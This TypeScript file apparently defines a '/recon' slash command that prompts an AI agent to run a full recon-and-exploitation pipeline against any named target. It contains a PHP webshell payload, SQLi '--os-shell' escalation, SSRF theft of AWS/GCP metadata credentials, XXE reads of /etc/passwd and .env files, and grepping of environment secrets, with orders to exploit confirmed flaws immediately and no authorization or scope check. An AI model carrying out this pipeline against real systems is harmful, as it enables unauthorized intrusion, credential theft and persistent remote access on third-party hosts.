import type { ContentBlockParam } from '@anthropic-ai/sdk/resources/index.mjs'
import type { Command } from '../../commands.js'
import { homedir } from 'os'
import { join } from 'path'

const recon = {
  type: 'prompt',
  name: 'recon',
  description: 'Structured 7-stage recon+exploit pipeline: subdomains → live hosts → endpoints → classify → detect → exploit critical findings → record',
  argumentHint: '<target>',
  source: 'builtin',
  progressMessage: 'Running recon pipeline',
  async getPromptForCommand(args: string): Promise<ContentBlockParam[]> {
    const target = args.trim()
    if (!target) {
      return [{ type: 'text', text: 'Usage: /recon <target>\nExample: /recon example.com' }]
    }
    const outputDir = join(homedir(), 'Targets', target, 'recon')
    return [{ type: 'text', text: buildReconPrompt(target, outputDir) }]
  },
  contentLength: 0,
} satisfies Command

function buildReconPrompt(target: string, outputDir: string): string {
  return `Execute a structured 7-stage recon and exploitation pipeline on **${target}**. Save all output to \`${outputDir}/\` — create the directory first with Bash if it doesn't exist.

## Stage 1 — Subdomain Enumeration
1. Use NmapTool with scan_type "scripts" and scripts ["dns-brute"] on target "${target}"
2. Use ReconTool action="crt_lookup" domain="${target}" to query certificate transparency logs
3. FuzzTool url="https://FUZZ.${target}/" wordlist="bounty-subs" — enumerate with real-world bug-bounty subdomain list
4. Combine, deduplicate, write to \`${outputDir}/subdomains.txt\` (one per line)

## Stage 2 — Live Host Probing
For each subdomain + "${target}" itself:
1. Use NmapTool with scan_type "service" and ports "80,443,8080,8443,8000,3000,5000,9090"
2. Identify which hosts have web services
3. Write live hosts + open ports/services to \`${outputDir}/live-hosts.txt\`

## Stage 3 — Endpoint Harvest
For each live web host:
1. FuzzTool with url "http://<host>/FUZZ" (and https if 443 open), wordlist "common"
2. FuzzTool again with wordlist "api" for API discovery
3. Collect all non-404 endpoints (include status codes and response sizes)
4. Write to \`${outputDir}/endpoints.txt\`

## Stage 4 — Classify by Vuln Class
For every endpoint in Stage 3, map to likely vuln classes using these signals:
- /api/, /v1/, /v2/, /v3/, /graphql → IDOR, mass-assignment, auth-bypass
- /login, /auth, /oauth, /token, /sso, /session → SQLi, auth-bypass, account-takeover
- /upload, /file, /import, /export, /download, /avatar → file-upload (→ chain: webshell), XXE
- /redirect, /url, /goto, /link, /next, /return → open-redirect
- /admin, /panel, /dashboard, /manage, /internal → access-control, priv-esc
- /search, /template, /render, ?q=, ?query=, ?s=, ?name= → SSTI (highest priority!), SQLi
- /webhook, /callback, /proxy, /fetch, /ping, ?url=, ?src=, ?link= → SSRF (→ chain: cloud-metadata)
- ?id=, ?user_id=, ?uid=, ?account= → IDOR
- /reset, /forgot, ?token=, ?key= → auth-bypass, token-leak
- /xml, /soap, /import, ?format=xml → XXE

Priority order: file-upload > SSTI > SSRF > SQLi > XXE > IDOR > auth-bypass > everything else

Write to \`${outputDir}/vuln-candidates.txt\` as: \`<url> → <vuln-class> [PRIORITY: high/medium/low]\`

## Stage 5 — Active Detection (3-strike limit per class)
Run at most 3 probes per vuln class before pivoting to the next class.

**SSTI candidates** (highest priority — leads directly to RCE):
- SSTITool action=detect on each /search, /render, /template endpoint
- If math payload evaluates → IMMEDIATELY proceed to Stage 6 SSTI chain

**SSRF candidates** (high priority — leads to cloud credential theft):
- SSRFTool action=scan on each ?url=, ?src=, /proxy, /fetch endpoint
- If SSRF confirmed → IMMEDIATELY proceed to Stage 6 SSRF chain

**SQLi candidates**:
- SQLiTool action=detect_only on login/search endpoints with id= or user= params
- If confirmed → IMMEDIATELY proceed to Stage 6 SQLi chain

**File upload candidates**:
- Try uploading .php webshell with image/jpeg Content-Type to each upload endpoint
- If execution path found → IMMEDIATELY proceed to Stage 6 webshell chain

**XXE candidates**:
- XXETool action=detect on XML-accepting endpoints
- If confirmed → IMMEDIATELY proceed to Stage 6 XXE chain

NmapTool scan_type="vuln" on the top 3 most interesting live hosts (parallel with above)
NucleiTool profile="kev" on all live hosts to check CISA Known Exploited Vulnerabilities

## Stage 6 — Exploitation (execute immediately on any confirmed finding from Stage 5)

**On SSTI confirmed:**
1. SSTITool action=identify → get exact engine
2. SSTITool action=exploit → OS command execution
3. Run post-RCE enumeration: id, hostname, cat /etc/passwd, env | grep -i "key|secret|pass|token", find config files
4. Write RCE proof to \`${outputDir}/rce-ssti.txt\`

**On SSRF confirmed:**
1. SSRFTool action=probe target=http://169.254.169.254/latest/meta-data/ → check AWS metadata
2. If AWS: retrieve IAM role + credentials from /latest/meta-data/iam/security-credentials/<role>
3. If GCP: probe http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
4. Probe internal IPs on common ports (Redis :6379, Elasticsearch :9200, Kubernetes :6443)
5. Write findings to \`${outputDir}/ssrf-findings.txt\`

**On SQLi confirmed:**
1. SQLiTool action=dump_dbs → enumerate databases
2. SQLiTool extra_args="--os-shell --batch" → attempt OS shell
3. If OS shell: PrivEscTool action=all for local priv-esc
4. Write credential dump to \`${outputDir}/sqli-dump.txt\`

**On file upload path to execution:**
1. Upload PHP webshell: <?php system($_GET['cmd']); ?>
2. Confirm execution: GET /uploads/shell.php?cmd=id
3. If RCE: run post-exploitation enumeration
4. Write proof to \`${outputDir}/webshell.txt\`

**On XXE confirmed:**
1. XXETool action=file_read file_path=/etc/passwd
2. XXETool action=file_read file_path=/proc/net/tcp → decode hex IPs → internal network map
3. Read app config files (wp-config.php, .env, database.yml, application.properties)
4. XXETool action=ssrf → pivot to internal services
5. Write findings to \`${outputDir}/xxe-lfi.txt\`

## Stage 7 — Record All Confirmed Findings
After any confirmed finding from Stage 6, record it formally:
\`\`\`
EngagementTool action=add_finding target="${target}" finding={
  title: "<vuln-class>-<endpoint-slug>",
  severity: "P1" | "P2" | "P3" | "P4",
  endpoint: "<METHOD> <url>",
  payload: "<exact payload>",
  evidence: "<output proving exploitability>",
  impact: "<what was achieved>",
  vuln_class: "<ssti|sqli|ssrf|file-upload|xxe|lfi|cmdi>"
}
\`\`\`

## Dead End Rule
After Stages 2-3: if you see ONLY 403/401 responses, no dynamic parameters, no API endpoints, and vuln scan returns nothing — stop immediately. State clearly: "Target not worth pursuing — reason: [specific observations]". Do not keep probing a dead target.

## Output
Finish with a structured summary:
\`\`\`
RECON + EXPLOIT SUMMARY: ${target}
Subdomains: N (list)
Live web hosts: N (list with ports)
Endpoints found: N
Vuln candidates: N (breakdown by class and priority)
Critical findings (RCE/shell/creds): [detailed]
High findings: [detailed]
Medium/Low findings: [brief list only]
Evidence files: [list files written to ${outputDir}/]
\`\`\``
}

export default recon
